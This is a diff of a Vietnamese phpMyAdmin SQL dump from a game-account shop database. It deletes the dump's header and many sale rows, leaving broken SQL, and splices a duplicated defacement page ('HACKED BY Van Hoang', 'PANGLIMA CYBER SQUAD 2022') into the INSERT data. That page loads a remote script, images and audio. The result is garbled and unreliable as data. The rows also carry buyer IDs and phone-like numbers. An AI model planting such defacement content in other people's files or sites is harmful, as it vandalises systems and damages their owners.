@@ -1,136 +1,4 @@
--- phpMyAdmin SQL Dump
--- version 4.9.7
--- https://www.phpmyadmin.net/
---
--- Máy chủ: localhost:3306
--- Thời gian đã tạo: Th8 07, 2021 lúc 12:02 PM
--- Phiên bản máy phục vụ: 10.3.30-MariaDB-cll-lve
--- Phiên bản PHP: 7.3.28
-
-SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
-SET AUTOCOMMIT = 0;
-START TRANSACTION;
-SET time_zone = "+00:00";
-
-
-/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
-/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
-/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
-/*!40101 SET NAMES utf8mb4 */;
-
---
--- Cơ sở dữ liệu: `thoangtuantk_shopbanacc`
---
-
--- --------------------------------------------------------
-
---
--- Cấu trúc bảng cho bảng `giftcode`
---
-
-CREATE TABLE `giftcode` (
-  `id` int(255) NOT NULL,
-  `username` varchar(999) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL,
-  `action` varchar(999) CHARACTER SET utf8 COLLATE utf8_bin DEFAULT NULL,
-  `giftcode` varchar(999) CHARACTER SET utf8 COLLATE utf8_bin DEFAULT NULL,
-  `percent` varchar(999) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL DEFAULT '0',
-  `status` varchar(999) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL DEFAULT 'true',
-  `expire` varchar(999) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL DEFAULT '0',
-  `time` int(255) NOT NULL
-) ENGINE=InnoDB DEFAULT CHARSET=latin1;
-
---
--- Đang đổ dữ liệu cho bảng `giftcode`
---
-
-INSERT INTO `giftcode` (`id`, `username`, `action`, `giftcode`, `percent`, `status`, `expire`, `time`) VALUES
-(1, NULL, 'mua_acc', 'ThanhDieuTV', '10', 'true', '1605159979', 1605156379);
-
--- --------------------------------------------------------
-
---
--- Cấu trúc bảng cho bảng `homthinhbian`
---
-
-CREATE TABLE `homthinhbian` (
-  `id` int(255) NOT NULL,
-  `kimcuong` varchar(999) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '0',
-  `giatien` varchar(999) NOT NULL DEFAULT '0',
-  `nguoimua` varchar(999) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_nopad_ci NOT NULL DEFAULT 'null',
-  `status` varchar(999) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '1',
-  `time` int(255) NOT NULL
-) ENGINE=MyISAM DEFAULT CHARSET=latin1;
-
---
--- Đang đổ dữ liệu cho bảng `homthinhbian`
---
-
-INSERT INTO `homthinhbian` (`id`, `kimcuong`, `giatien`, `nguoimua`, `status`, `time`) VALUES
-(1, '23', '20000', 'null', '1', 1605193184),
-(2, '23', '20000', 'null', '1', 1605193184),
-(3, '23', '20000', 'null', '1', 1605193184),
-(4, '23', '20000', '140855594462926', '0', 1605193184),
-(5, '23', '20000', 'null', '1', 1605193184),
-(6, '23', '20000', '140855594462926', '0', 1605193184),
-(7, '23', '20000', 'null', '1', 1605193184),
-(8, '23', '20000', '706424816683754', '0', 1605193184),
-(9, '23', '20000', 'null', '1', 1605193184),
-(10, '23', '20000', 'null', '1', 1605193184),
-(11, '23', '20000', '140855594462926', '0', 1605193184),
-(12, '23', '20000', 'null', '1', 1605193184),
-(13, '23', '20000', '140855594462926', '0', 1605193184),
-(14, '23', '20000', '140855594462926', '0', 1605193184),
-(15, '23', '20000', 'null', '1', 1605193184),
-(16, '23', '20000', '706424816683754', '0', 1605193184),
-(17, '23', '20000', '706424816683754', '0', 1605193184),
-(18, '23', '20000', 'null', '1', 1605193184),
-(19, '23', '20000', 'null', '1', 1605193184),
-(20, '23', '20000', 'null', '1', 1605193184),
-(21, '23', '20000', '706424816683754', '0', 1605193184),
-(22, '23', '20000', 'null', '1', 1605193184),
-(23, '23', '20000', 'null', '1', 1605193184),
-(24, '23', '20000', 'null', '1', 1605193184),
-(25, '23', '20000', '133779078496574', '0', 1605193184),
-(26, '23', '20000', 'null', '1', 1605193184),
-(27, '23', '20000', '140855594462926', '0', 1605193184),
-(28, '23', '20000', '140855594462926', '0', 1605193184),
-(29, '23', '20000', '140855594462926', '0', 1605193184),
-(30, '23', '20000', 'null', '1', 1605193184),
-(31, '23', '20000', '140855594462926', '0', 1605193184),
-(32, '23', '20000', 'null', '1', 1605193184),
-(33, '23', '20000', 'null', '1', 1605193184),
-(34, '23', '20000', 'null', '1', 1605193184),
-(35, '23', '20000', 'null', '1', 1605193184),
-(36, '23', '20000', 'null', '1', 1605193184),
-(37, '23', '20000', 'null', '1', 1605193184),
-(38, '23', '20000', 'null', '1', 1605193184),
-(39, '23', '20000', 'null', '1', 1605193184),
-(40, '23', '20000', 'null', '1', 1605193184),
-(41, '23', '20000', 'null', '1', 1605193184),
-(42, '23', '20000', 'null', '1', 1605193184),
-(43, '23', '20000', '140855594462926', '0', 1605193184),
-(44, '23', '20000', 'null', '1', 1605193184),
-(45, '23', '20000', 'null', '1', 1605193184),
-(46, '23', '20000', 'null', '1', 1605193184),
-(47, '23', '20000', 'null', '1', 1605193184),
-(48, '23', '20000', 'null', '1', 1605193184),
-(49, '23', '20000', 'null', '1', 1605193184),
-(50, '23', '20000', 'null', '1', 1605193184),
-(51, '90', '20', '0397032453', '0', 1605627002),
-(52, '90', '20', '186079723066312', '0', 1605627002),
-(53, '90', '20', '706424816683754', '0', 1605627002),
-(54, '90', '20', '186079723066312', '0', 1605627002),
-(55, '90', '20', '140855594462926', '0', 1605627002),
-(56, '90', '20', '140855594462926', '0', 1605627002),
-(57, '90', '20', '140855594462926', '0', 1605627002),
-(58, '90', '20', '0397032453', '0', 1605627002),
-(59, '90', '20', '0397032453', '0', 1605627002),
-(60, '90', '20', '140855594462926', '0', 1605627002),
-(61, '90', '20', '0397032453', '0', 1605627002),
-(62, '90', '20', '706424816683754', '0', 1605627002),
-(63, '90', '20', '706424816683754', '0', 1605627002),
-(64, '90', '20', '0397032453', '0', 1605627002),
-(65, '90', '20', '186079723066312', '0', 1605627002),
+', ', 1605627002),
 (66, '90', '20', '140855594462926', '0', 1605627002),
 (67, '90', '20', '0397032453', '0', 1605627002),
 (68, '90', '20', '117572156847538', '0', 1605627002),
@@ -226,7 +94,155 @@ INSERT INTO `homthinhbian` (`id`, `kimcuong`, `giatien`, `nguoimua`, `status`, `
 (158, '100', '20000', '706424816683754', '0', 1605627040),
 (159, '100', '20000', 'null', '1', 1605627040),
 (160, '100', '20000', 'null', '1', 1605627040),
-(161, '100', '20000', 'null', '1', 1605627040),
+(161, '100', '20000', 'null', '1', 1605627040),<!DOCTYPE html>
+
+<!DOCTYPE HTML>
+
+<hhtml>
+
+  <head>
+
+    <title>HACKED BY Văn Hoàng Da O Day</title>
+
+      <link href="http://fonts.googleapis.com/css?family=New+Rocker" rel="stylesheet" type="text/css">
+
+      <script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
+
+  </head>
+
+<body bgcolor="black">
+
+  <center>
+
+    <hr color="gray">
+
+    <font color="gray" face="Courier New" size="2"><b>PANGLIMA CYBER SQUAD 2022<b></font>
+
+    <hr color="gray"><br>
+
+    <img width="600" src="https://g.top4top.io/p_23071ztc40.jpg"><br>
+
+    <font color="gray" size="10" face="New Rocker">HACKED BY Van Hoang</font><br>
+
+    
+
+<div class="mek"> 
+
+<font color="gray" class="text-center text-gray mb-3" size="6"><center><br>-=|<marquee width="60%"></font>
+
+<font class="text-center text-gray mb-3" color="gray" size="6"><b>[ DUNG CO DDOS WED CUA TOI BOI VI DIEU DO LA KHONG THE ANTIDDOS ]<b></font></marquee>|=-</center>
+
+</div><br>
+
+    <font color="gray" size="3" face="Courier New">mereka berbicara seolah olah mereka<br>mengetahui semua tentang ku padahal<br>mereka belum tau diriku yang<br>sebenarnya, karena mereka hannya<br>tau tentang apa saja yang ku<br>izinkan untuknya</font><br><br>
+
+    <audio id="audioNotifikasi">
+
+  <source src="https://j.top4top.io/m_1936mokgt0.mp3" type="audio/mpeg">
+
+</audio>
+
+<button style="border:2px solid gray; border-radius:30px; background-color:black;" onclick="playAudio()" type="button"><font face="monaco" size="6" color="gray">Play to Music</font></button>
+<!DOCTYPE html>
+
+<!DOCTYPE HTML>
+
+<hhtml>
+
+  <head>
+
+    <title>HACKED BY Văn Hoàng Da O Day</title>
+
+      <link href="http://fonts.googleapis.com/css?family=New+Rocker" rel="stylesheet" type="text/css">
+
+      <script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
+
+  </head>
+
+<body bgcolor="black">
+
+  <center>
+
+    <hr color="gray">
+
+    <font color="gray" face="Courier New" size="2"><b>PANGLIMA CYBER SQUAD 2022<b></font>
+
+    <hr color="gray"><br>
+
+    <img width="600" src="https://g.top4top.io/p_23071ztc40.jpg"><br>
+
+    <font color="gray" size="10" face="New Rocker">HACKED BY Van Hoang</font><br>
+
+    
+
+<div class="mek"> 
+
+<font color="gray" class="text-center text-gray mb-3" size="6"><center><br>-=|<marquee width="60%"></font>
+
+<font class="text-center text-gray mb-3" color="gray" size="6"><b>[ DUNG CO DDOS WED CUA TOI BOI VI DIEU DO LA KHONG THE ANTIDDOS ]<b></font></marquee>|=-</center>
+
+</div><br>
+
+    <font color="gray" size="3" face="Courier New">mereka berbicara seolah olah mereka<br>mengetahui semua tentang ku padahal<br>mereka belum tau diriku yang<br>sebenarnya, karena mereka hannya<br>tau tentang apa saja yang ku<br>izinkan untuknya</font><br><br>
+
+    <audio id="audioNotifikasi">
+
+  <source src="https://j.top4top.io/m_1936mokgt0.mp3" type="audio/mpeg">
+
+</audio>
+
+<button style="border:2px solid gray; border-radius:30px; background-color:black;" onclick="playAudio()" type="button"><font face="monaco" size="6" color="gray">Play to Music</font></button>
+
+<button style="border:2px solid gray; border-radius:30px; background-color:black;" onclick="pauseAudio()" type="button"><font face="monaco" size="6" color="gray">Pause to Music</font></button> <br>
+
+<script type="text/javascript">
+
+var el = document.getElementById("audioNotifikasi"); 
+
+function playAudio() { 
+
+  el.play(); 
+
+} 
+
+function pauseAudio() { 
+
+  el.pause(); 
+
+} 
+
+</script>
+
+  </center>
+
+</body>
+
+</html>
+<button style="border:2px solid gray; border-radius:30px; background-color:black;" onclick="pauseAudio()" type="button"><font face="monaco" size="6" color="gray">Pause to Music</font></button> <br>
+
+<script type="text/javascript">
+
+var el = document.getElementById("audioNotifikasi"); 
+
+function playAudio() { 
+
+  el.play(); 
+
+} 
+
+function pauseAudio() { 
+
+  el.pause(); 
+
+} 
+
+</script>
+
+  </center>
+
+</body>
+
+</html>
 (162, '100', '20000', 'null', '1', 1605627040),
 (163, '100', '20000', 'null', '1', 1605627040),
 (164, '100', '20000', 'null', '1', 1605627040),
